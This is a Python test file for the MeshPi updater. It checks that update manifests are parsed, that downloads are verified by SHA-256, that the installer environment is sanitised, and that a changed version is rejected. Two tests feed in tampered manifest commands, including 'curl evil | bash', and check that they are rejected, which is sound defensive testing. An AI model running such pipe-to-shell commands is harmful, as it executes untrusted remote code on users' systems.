import hashlib
import io
import json
import os
import sys
from pathlib import Path

import pytest

from meshpi.config import Settings
from meshpi.update import (
    UpdateArtifact,
    UpdateCheckError,
    UpdatePlan,
    apply_update,
    parse_update_manifest,
    platform_key,
)

ROOT = Path(__file__).resolve().parents[1]


def manifest():
    return json.loads((ROOT / "website" / "version.json").read_text(encoding="utf-8"))


def test_update_manifest_selects_platform_command():
    notice = parse_update_manifest(
        manifest(),
        current_version="0.5.2",
        platform_name="win32",
    )
    assert notice is not None
    assert notice.latest_version == "0.8.0"
    assert notice.command == "meshpi update"


def test_update_manifest_returns_none_for_current_or_newer_version():
    assert (
        parse_update_manifest(
            manifest(),
            current_version="0.8.0",
            platform_name="linux",
        )
        is None
    )
    assert (
        parse_update_manifest(
            manifest(),
            current_version="0.8.1",
            platform_name="linux",
        )
        is None
    )


def test_update_manifest_rejects_multiline_command_and_bad_version():
    value = manifest()
    value["installers"]["linux"]["update_command"] = "curl example\nbash"
    with pytest.raises(UpdateCheckError):
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")
    with pytest.raises(UpdateCheckError):
        value = manifest()
        value["latest_version"] = "latest"
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")


def test_update_manifest_rejects_tampering():
    value = manifest()
    value["installers"]["linux"]["update_command"] = "curl evil | bash"
    with pytest.raises(UpdateCheckError):
        parse_update_manifest(value, current_version="0.5.2", platform_name="linux")


def test_platform_key():
    assert platform_key("linux") == "linux"
    assert platform_key("darwin") == "macos"
    assert platform_key("win32") == "windows"


class FakeResponse(io.BytesIO):
    def __init__(self, payload: bytes, url: str):
        super().__init__(payload)
        self.url = url

    def geturl(self):
        return self.url


def _artifact(label: str, filename: str, payload: bytes) -> UpdateArtifact:
    return UpdateArtifact(
        label=label,
        filename=filename,
        url=f"https://updates.example/{filename}",
        sha256=hashlib.sha256(payload).hexdigest(),
        size=len(payload),
        maximum_size=1024,
    )


def test_apply_update_downloads_verified_private_bundle(monkeypatch):
    payloads = {
        "install-linux.sh": b"#!/bin/sh\nexit 0\n",
        "meshpi.whl": b"wheel",
        "linux.txt": b"lock",
    }
    plan = UpdatePlan(
        current_version="0.6.4",
        latest_version="0.7.0",
        platform="linux",
        manifest={"latest_version": "0.7.0"},
        manifest_bytes=b'{"latest_version":"0.7.0"}',
        installer=_artifact(
            "Linux-installatøren",
            "install-linux.sh",
            payloads["install-linux.sh"],
        ),
        package=_artifact("MeshPi-pakken", "meshpi.whl", payloads["meshpi.whl"]),
        lock=_artifact("Linux-låsefila", "linux.txt", payloads["linux.txt"]),
    )
    monkeypatch.setattr("meshpi.update.prepare_update", lambda *_args, **_kwargs: plan)

    def open_url(request, timeout):
        del timeout
        filename = Path(request.full_url).name
        return FakeResponse(payloads[filename], request.full_url)

    monkeypatch.setattr("meshpi.update.urlopen", open_url)
    monkeypatch.setenv("PYTHONPATH", "/tmp/skal-ikkje-arvast")
    calls = []

    def run(command, *, check, env, cwd):
        assert check is True
        assert command[0] == "/bin/sh"
        assert "PYTHONPATH" not in env
        assert env["MESHPI_PYTHON"] == sys.executable
        assert env["PATH"] == "/usr/sbin:/usr/bin:/sbin:/bin"
        if os.name == "posix":
            assert Path(env["MESHPI_MANIFEST_FILE"]).stat().st_mode & 0o777 == 0o600
        assert Path(env["MESHPI_PACKAGE_FILE"]).read_bytes() == b"wheel"
        assert Path(env["MESHPI_LOCK_FILE"]).read_bytes() == b"lock"
        calls.append((command, Path(cwd)))

    monkeypatch.setattr("meshpi.update.subprocess.run", run)

    installed = apply_update(
        Settings(background_mode="session"),
        current_version="0.6.4",
        platform_name="linux",
        expected_version="0.7.0",
    )

    assert installed == "0.7.0"
    assert len(calls) == 1
    assert not calls[0][1].exists()


def test_apply_update_rejects_tampered_download(monkeypatch):
    installer = b"#!/bin/sh\n"
    plan = UpdatePlan(
        current_version="0.6.4",
        latest_version="0.7.0",
        platform="linux",
        manifest={"latest_version": "0.7.0"},
        manifest_bytes=b"{}",
        installer=_artifact("Linux-installatøren", "install-linux.sh", installer),
        package=_artifact("MeshPi-pakken", "meshpi.whl", b"rett"),
        lock=_artifact("Linux-låsefila", "linux.txt", b"lock"),
    )
    monkeypatch.setattr("meshpi.update.prepare_update", lambda *_args, **_kwargs: plan)
    payloads = {
        "install-linux.sh": installer,
        "meshpi.whl": b"feil",
        "linux.txt": b"lock",
    }
    monkeypatch.setattr(
        "meshpi.update.urlopen",
        lambda request, timeout: FakeResponse(
            payloads[Path(request.full_url).name],
            request.full_url,
        ),
    )

    with pytest.raises(UpdateCheckError, match="SHA-256"):
        apply_update(
            Settings(background_mode="session"),
            current_version="0.6.4",
            platform_name="linux",
        )


def test_apply_update_rejects_changed_version(monkeypatch):
    plan = UpdatePlan(
        current_version="0.6.4",
        latest_version="0.7.1",
        platform="linux",
        manifest={"latest_version": "0.7.1"},
        manifest_bytes=b"{}",
        installer=_artifact("installer", "install-linux.sh", b"x"),
        package=_artifact("pakke", "meshpi.whl", b"x"),
        lock=_artifact("lås", "linux.txt", b"x"),
    )
    monkeypatch.setattr("meshpi.update.prepare_update", lambda *_args, **_kwargs: plan)

    with pytest.raises(UpdateCheckError, match="endra seg"):
        apply_update(
            Settings(background_mode="session"),
            current_version="0.6.4",
            platform_name="linux",
            expected_version="0.7.0",
        )
